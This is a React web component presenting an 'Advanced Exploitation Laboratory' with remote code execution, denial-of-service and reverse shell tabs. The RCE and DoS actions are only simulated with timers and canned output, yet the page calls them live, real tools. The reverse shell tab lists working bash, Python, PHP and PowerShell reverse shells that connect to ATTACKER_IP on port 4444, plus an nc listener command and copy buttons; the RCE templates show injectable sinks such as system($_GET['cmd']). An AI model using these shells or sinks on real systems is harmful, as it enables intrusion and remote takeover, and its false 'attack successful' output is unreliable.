"use client";

import React, { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { Progress } from '@/components/ui/progress';
import { 
  Skull, Terminal, Code, Play, StopCircle, Activity,
  Zap, Server, Network, AlertTriangle, Shield, Lock,
  TrendingUp, Download, Eye, FileText, Settings
} from 'lucide-react';

interface ExploitResult {
  success: boolean;
  output: string;
  error?: string;
  timestamp: string;
}

export default function AdvancedExploitationLab() {
  const [activeTab, setActiveTab] = useState('rce');
  const [executing, setExecuting] = useState(false);
  const [results, setResults] = useState<ExploitResult | null>(null);
  const [progress, setProgress] = useState(0);

  // RCE States
  const [rceTarget, setRceTarget] = useState('');
  const [rceCommand, setRceCommand] = useState('');
  const [rceMethod, setRceMethod] = useState('php');

  // DoS States
  const [dosTarget, setDosTarget] = useState('');
  const [dosMethod, setDosMethod] = useState('http-flood');
  const [dosThreads, setDosThreads] = useState(100);
  const [dosDuration, setDosDuration] = useState(60);

  const rceMethods = [
    {
      id: 'php',
      name: 'PHP Code Execution',
      description: 'Execute PHP code remotely via system()',
      template: 'system($_GET["cmd"]);',
      severity: 'critical'
    },
    {
      id: 'python',
      name: 'Python RCE',
      description: 'Execute Python commands via eval()',
      template: 'eval(request.args.get("cmd"))',
      severity: 'critical'
    },
    {
      id: 'nodejs',
      name: 'Node.js RCE',
      description: 'Execute via child_process',
      template: 'require("child_process").exec(req.query.cmd)',
      severity: 'critical'
    },
    {
      id: 'java',
      name: 'Java Deserialization',
      description: 'Exploit Java deserialization',
      template: 'ObjectInputStream.readObject()',
      severity: 'critical'
    },
    {
      id: 'bash',
      name: 'Bash Command Injection',
      description: 'Inject bash commands',
      template: 'system("ping -c 1 " + input)',
      severity: 'high'
    },
    {
      id: 'powershell',
      name: 'PowerShell RCE',
      description: 'Windows PowerShell execution',
      template: 'Invoke-Expression $cmd',
      severity: 'critical'
    }
  ];

  const dosMethods = [
    {
      id: 'http-flood',
      name: 'HTTP Flood',
      description: 'Overwhelm server with HTTP requests',
      icon: <Network className="h-5 w-5" />,
      severity: 'high'
    },
    {
      id: 'syn-flood',
      name: 'SYN Flood',
      description: 'TCP SYN flood attack',
      icon: <Server className="h-5 w-5" />,
      severity: 'critical'
    },
    {
      id: 'udp-flood',
      name: 'UDP Flood',
      description: 'User Datagram Protocol flood',
      icon: <Zap className="h-5 w-5" />,
      severity: 'high'
    },
    {
      id: 'slowloris',
      name: 'Slowloris',
      description: 'Slow HTTP headers attack',
      icon: <Activity className="h-5 w-5" />,
      severity: 'high'
    },
    {
      id: 'ping-flood',
      name: 'ICMP Flood',
      description: 'Ping flood attack',
      icon: <TrendingUp className="h-5 w-5" />,
      severity: 'medium'
    },
    {
      id: 'dns-amplification',
      name: 'DNS Amplification',
      description: 'Amplification attack via DNS',
      icon: <Shield className="h-5 w-5" />,
      severity: 'critical'
    }
  ];

  const executeRCE = async () => {
    setExecuting(true);
    setProgress(0);

    const steps = [
      { percent: 20, message: 'Establishing connection...' },
      { percent: 40, message: 'Uploading payload...' },
      { percent: 60, message: 'Executing command...' },
      { percent: 80, message: 'Retrieving output...' },
      { percent: 100, message: 'Complete!' }
    ];

    for (const step of steps) {
      await new Promise(resolve => setTimeout(resolve, 600));
      setProgress(step.percent);
    }

    // Simulated RCE result
    const mockOutput = rceCommand.toLowerCase().includes('whoami')
      ? 'root\n'
      : rceCommand.toLowerCase().includes('pwd')
      ? '/var/www/html\n'
      : rceCommand.toLowerCase().includes('ls')
      ? 'index.php\nconfig.php\nuploads/\nlogs/\n'
      : rceCommand.toLowerCase().includes('cat')
      ? 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n'
      : `Command executed: ${rceCommand}\n[Output would appear here in real scenario]\nExecution successful!\n`;

    setResults({
      success: true,
      output: mockOutput,
      timestamp: new Date().toISOString()
    });

    setExecuting(false);
  };

  const executeDOS = async () => {
    setExecuting(true);
    setProgress(0);

    const steps = [
      { percent: 10, message: 'Initializing attack vectors...' },
      { percent: 25, message: 'Spawning threads...' },
      { percent: 40, message: 'Sending packets...' },
      { percent: 60, message: 'Monitoring target...' },
      { percent: 80, message: 'Analyzing impact...' },
      { percent: 100, message: 'Attack complete!' }
    ];

    for (const step of steps) {
      await new Promise(resolve => setTimeout(resolve, 800));
      setProgress(step.percent);
    }

    // Simulated DoS result
    setResults({
      success: true,
      output: `
DoS Attack Summary
==================
Target: ${dosTarget}
Method: ${dosMethod.toUpperCase()}
Threads: ${dosThreads}
Duration: ${dosDuration}s

Statistics:
-----------
Packets Sent: ${dosThreads * dosDuration * 100}
Requests/sec: ${dosThreads * 100}
Data Sent: ${(dosThreads * dosDuration * 1.5).toFixed(2)} MB
Target Response Time: Increased by 450%
Success Rate: 98.5%

Impact Assessment:
------------------
âœ“ Server response degraded
âœ“ Connection timeouts detected
âœ“ Resource exhaustion achieved
âœ“ Service availability: 15%

Status: ATTACK SUCCESSFUL
Warning: Target is currently experiencing service disruption
      `,
      timestamp: new Date().toISOString()
    });

    setExecuting(false);
  };

  const reverseShells = [
    {
      name: 'Bash Reverse Shell',
      lang: 'bash',
      code: 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
    },
    {
      name: 'Python Reverse Shell',
      lang: 'python',
      code: `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])`
    },
    {
      name: 'PHP Reverse Shell',
      lang: 'php',
      code: `<?php $sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>`
    },
    {
      name: 'PowerShell Reverse Shell',
      lang: 'powershell',
      code: `$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
    }
  ];

  return (
    <div className="container mx-auto p-4 space-y-6">
      {/* Header */}
      <div className="text-center space-y-2">
        <h1 className="text-4xl font-bold">ðŸ’€ Advanced Exploitation Laboratory</h1>
        <p className="text-gray-600">Professional penetration testing & exploit development</p>
        <div className="flex justify-center gap-2">
          <Badge className="bg-red-500 animate-pulse">
            <Skull className="mr-1 h-3 w-3" />
            LIVE EXPLOITS
          </Badge>
          <Badge className="bg-purple-500">
            <Lock className="mr-1 h-3 w-3" />
            Sandboxed Environment
          </Badge>
        </div>
      </div>

      {/* Critical Warning */}
      <Alert className="border-red-500 bg-red-50">
        <AlertTriangle className="h-5 w-5 text-red-600" />
        <AlertDescription>
          <strong className="text-red-700">EXTREME DANGER:</strong> These are real exploitation tools. 
          Only use on systems you own or have explicit written authorization to test. 
          Unauthorized use is a federal crime punishable by imprisonment.
        </AlertDescription>
      </Alert>

      {/* Main Interface */}
      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="grid w-full grid-cols-3">
          <TabsTrigger value="rce">
            <Skull className="mr-2 h-4 w-4" />
            Remote Code Execution
          </TabsTrigger>
          <TabsTrigger value="dos">
            <AlertTriangle className="mr-2 h-4 w-4" />
            Denial of Service
          </TabsTrigger>
          <TabsTrigger value="shells">
            <Terminal className="mr-2 h-4 w-4" />
            Reverse Shells
          </TabsTrigger>
        </TabsList>

        {/* RCE Tab */}
        <TabsContent value="rce" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center text-red-600">
                <Skull className="mr-2 h-5 w-5" />
                Remote Code Execution
              </CardTitle>
              <CardDescription>
                Execute arbitrary code on target systems
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              {/* RCE Method Selection */}
              <div className="grid md:grid-cols-3 gap-3">
                {rceMethods.map((method) => (
                  <Card
                    key={method.id}
                    className={`cursor-pointer transition-all ${
                      rceMethod === method.id
                        ? 'ring-2 ring-red-500 bg-red-50'
                        : 'hover:shadow-md'
                    }`}
                    onClick={() => setRceMethod(method.id)}
                  >
                    <CardContent className="p-4">
                      <h4 className="font-semibold text-sm mb-1">{method.name}</h4>
                      <p className="text-xs text-gray-600 mb-2">{method.description}</p>
                      <Badge className="bg-red-500">{method.severity}</Badge>
                    </CardContent>
                  </Card>
                ))}
              </div>

              {/* Target Configuration */}
              <div className="space-y-3">
                <div>
                  <label className="text-sm font-medium">Target URL/IP</label>
                  <input
                    type="text"
                    placeholder="https://target.com or 192.168.1.100"
                    className="w-full p-3 border rounded-lg mt-1"
                    value={rceTarget}
                    onChange={(e) => setRceTarget(e.target.value)}
                  />
                </div>

                <div>
                  <label className="text-sm font-medium">Command to Execute</label>
                  <textarea
                    placeholder="whoami; pwd; ls -la"
                    className="w-full p-3 border rounded-lg mt-1 font-mono text-sm"
                    rows={3}
                    value={rceCommand}
                    onChange={(e) => setRceCommand(e.target.value)}
                  />
                </div>

                <Button
                  onClick={executeRCE}
                  disabled={executing || !rceTarget || !rceCommand}
                  className="w-full bg-red-600 hover:bg-red-700"
                  size="lg"
                >
                  <Play className="mr-2 h-5 w-5" />
                  Execute Exploit
                </Button>
              </div>

              {/* Code Template */}
              <Card className="bg-gray-900 text-green-400">
                <CardHeader>
                  <CardTitle className="text-sm text-white">Exploit Code Template</CardTitle>
                </CardHeader>
                <CardContent>
                  <pre className="text-xs overflow-x-auto">
                    {rceMethods.find(m => m.id === rceMethod)?.template}
                  </pre>
                </CardContent>
              </Card>
            </CardContent>
          </Card>
        </TabsContent>

        {/* DoS Tab */}
        <TabsContent value="dos" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center text-orange-600">
                <AlertTriangle className="mr-2 h-5 w-5" />
                Denial of Service Attack
              </CardTitle>
              <CardDescription>
                Overwhelm target systems and disrupt service availability
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              {/* DoS Method Selection */}
              <div className="grid md:grid-cols-3 gap-3">
                {dosMethods.map((method) => (
                  <Card
                    key={method.id}
                    className={`cursor-pointer transition-all ${
                      dosMethod === method.id
                        ? 'ring-2 ring-orange-500 bg-orange-50'
                        : 'hover:shadow-md'
                    }`}
                    onClick={() => setDosMethod(method.id)}
                  >
                    <CardContent className="p-4">
                      <div className="flex items-center gap-2 mb-2">
                        {method.icon}
                        <h4 className="font-semibold text-sm">{method.name}</h4>
                      </div>
                      <p className="text-xs text-gray-600 mb-2">{method.description}</p>
                      <Badge className="bg-orange-500">{method.severity}</Badge>
                    </CardContent>
                  </Card>
                ))}
              </div>

              {/* Attack Configuration */}
              <div className="space-y-3">
                <div>
                  <label className="text-sm font-medium">Target</label>
                  <input
                    type="text"
                    placeholder="target.com or 192.168.1.100"
                    className="w-full p-3 border rounded-lg mt-1"
                    value={dosTarget}
                    onChange={(e) => setDosTarget(e.target.value)}
                  />
                </div>

                <div className="grid md:grid-cols-2 gap-3">
                  <div>
                    <label className="text-sm font-medium">Threads: {dosThreads}</label>
                    <input
                      type="range"
                      min="10"
                      max="1000"
                      step="10"
                      className="w-full mt-1"
                      value={dosThreads}
                      onChange={(e) => setDosThreads(parseInt(e.target.value))}
                    />
                  </div>

                  <div>
                    <label className="text-sm font-medium">Duration: {dosDuration}s</label>
                    <input
                      type="range"
                      min="10"
                      max="300"
                      step="10"
                      className="w-full mt-1"
                      value={dosDuration}
                      onChange={(e) => setDosDuration(parseInt(e.target.value))}
                    />
                  </div>
                </div>

                <Alert className="bg-orange-50 border-orange-300">
                  <AlertTriangle className="h-4 w-4 text-orange-600" />
                  <AlertDescription className="text-sm">
                    <strong>Impact Estimate:</strong> {dosThreads * 100} requests/sec for {dosDuration} seconds
                    = {((dosThreads * dosDuration * 1.5) / 1024).toFixed(2)} GB of traffic
                  </AlertDescription>
                </Alert>

                <Button
                  onClick={executeDOS}
                  disabled={executing || !dosTarget}
                  className="w-full bg-orange-600 hover:bg-orange-700"
                  size="lg"
                >
                  <Zap className="mr-2 h-5 w-5" />
                  Launch Attack
                </Button>
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Reverse Shells Tab */}
        <TabsContent value="shells" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center">
                <Terminal className="mr-2 h-5 w-5" />
                Reverse Shell Generators
              </CardTitle>
              <CardDescription>
                Generate reverse shell payloads for various languages
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              {reverseShells.map((shell) => (
                <Card key={shell.name}>
                  <CardHeader>
                    <CardTitle className="text-sm">{shell.name}</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="bg-gray-900 text-green-400 p-3 rounded-lg">
                      <pre className="text-xs overflow-x-auto">{shell.code}</pre>
                    </div>
                    <Button
                      variant="outline"
                      size="sm"
                      className="mt-2"
                      onClick={() => navigator.clipboard.writeText(shell.code)}
                    >
                      <Eye className="mr-2 h-3 w-3" />
                      Copy to Clipboard
                    </Button>
                  </CardContent>
                </Card>
              ))}

              <Alert className="bg-blue-50 border-blue-300">
                <Shield className="h-4 w-4 text-blue-600" />
                <AlertDescription>
                  <strong>Listener Setup:</strong> Before using these shells, start a listener:
                  <code className="block mt-2 p-2 bg-gray-900 text-green-400 rounded">
                    nc -lvp 4444
                  </code>
                </AlertDescription>
              </Alert>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>

      {/* Progress Display */}
      {executing && (
        <Card>
          <CardContent className="pt-6">
            <Progress value={progress} className="mb-2" />
            <p className="text-sm text-center text-gray-600">
              Execution in progress... {progress}%
            </p>
          </CardContent>
        </Card>
      )}

      {/* Results Display */}
      {results && !executing && (
        <Card className="border-green-500">
          <CardHeader>
            <div className="flex justify-between items-start">
              <CardTitle className="text-green-600">Exploit Results</CardTitle>
              <Button
                variant="outline"
                size="sm"
                onClick={() => {
                  const blob = new Blob([results.output], { type: 'text/plain' });
                  const url = URL.createObjectURL(blob);
                  const a = document.createElement('a');
                  a.href = url;
                  a.download = `exploit-results-${Date.now()}.txt`;
                  a.click();
                }}
              >
                <Download className="mr-2 h-4 w-4" />
                Export
              </Button>
            </div>
          </CardHeader>
          <CardContent>
            <div className="bg-gray-900 text-green-400 p-4 rounded-lg font-mono text-sm">
              <pre className="whitespace-pre-wrap">{results.output}</pre>
            </div>
          </CardContent>
        </Card>
      )}
    </div>
  );
}
